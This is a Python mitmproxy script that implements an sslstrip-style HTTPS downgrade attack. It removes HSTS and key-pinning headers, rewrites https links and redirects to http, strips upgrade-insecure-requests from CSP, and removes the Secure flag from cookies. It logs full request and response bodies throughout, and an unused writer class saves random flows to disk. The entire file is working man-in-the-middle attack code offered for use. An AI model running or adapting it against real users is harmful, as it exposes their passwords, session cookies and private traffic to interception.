"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
import re
import urllib.parse
import typing  # noqa

from mitmproxy import (
    flow,
    ctx,
    http,
    flowfilter,
    io,)

import random
import typing

# 支持SSL/TLS的主机集
secure_hosts: typing.Set[str] = set()

logger = ctx.log

class Writer:
    def __init__(self, path: str) -> None:
        self.f: typing.IO[bytes] = open(path, "wb")
        self.w = io.FlowWriter(self.f)

    def response(self, flow: http.HTTPFlow) -> None:
        response = flow.response
        logger.info(str(response.text))
        logger.info(response.headers)
        if random.choice([True, False]):
            self.w.add(flow)

    def done(self):
        self.f.close()

def request(flow) -> None:
    """
    请求
    :param flow: 不做限制 eg: flow: http.HTTPFlow
    :return:
    """
    response = flow.response
    request = flow.request
    logger.info(str(request.host))
    request.headers.pop('If-Modified-Since', None)
    request.headers.pop('Cache-Control', None)

    # do not force https redirection
    request.headers.pop('Upgrade-Insecure-Requests', None)

    # proxy connections to SSL-enabled hosts
    if request.pretty_host in secure_hosts:
        request.scheme = 'https'
        request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        request.host = request.pretty_host

def response(flow) -> None:
    """
    应答
    :param flow: 不做限制 eg: flow: http.HTTPFlow
    :return:
    """
    response = flow.response
    request = flow.request

    logger.info(str(response.text))

    response.headers.pop('Strict-Transport-Security', None)
    response.headers.pop('Public-Key-Pins', None)

    # strip links in response body
    response.content = response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = br'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    response.content = re.sub(csp_meta_tag_pattern, b'', response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if response.headers.get('Location', '').startswith('https://'):
        location = response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        response.headers['Location'] = location.replace('https://', 'http://', 1)

    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        csp = response.headers['Content-Security-Policy']
        response.headers['Content-Security-Policy'] = re.sub(r'upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

    # strip secure flag from 'Set-Cookie' headers
    cookies = response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    response.headers.set_all('Set-Cookie', cookies)
